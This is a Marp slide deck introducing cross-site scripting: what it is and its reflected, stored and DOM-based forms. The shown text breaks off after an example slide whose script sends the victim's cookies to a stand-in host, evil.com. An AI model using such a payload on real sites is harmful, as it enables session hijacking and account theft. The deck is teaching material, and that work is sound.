---
marp: true
theme: default
paginate: true
_paginate: false

<!--
https://pentest-tools.com/blog/sql-injection-attacks
-->
---

<!-- _class: lead -->
# Cross-Site Scripting (XSS)

---

## What is XSS?

- A type of web application vulnerability
- Allows attacker to inject malicious scripts
- Scripts execute in the victim's browser
- Can lead to session hijacking, data theft, and more

---

## Types of XSS

### Reflected XSS
- Payload is part of the request
- Reflected back in the response
- Typically occurs in search fields, error messages

### Stored XSS
- Payload is stored on the server
- Displayed to other users
- Common in user forums, comment sections

### DOM-Based XSS
- Payload never sent to the server
- Executed by modifying the DOM environment

---

## XSS Attack Examples

### Stealing Cookies
```html
<script>
  document.location='http://evil.com/steal?cookie='+document.cookie
</script>
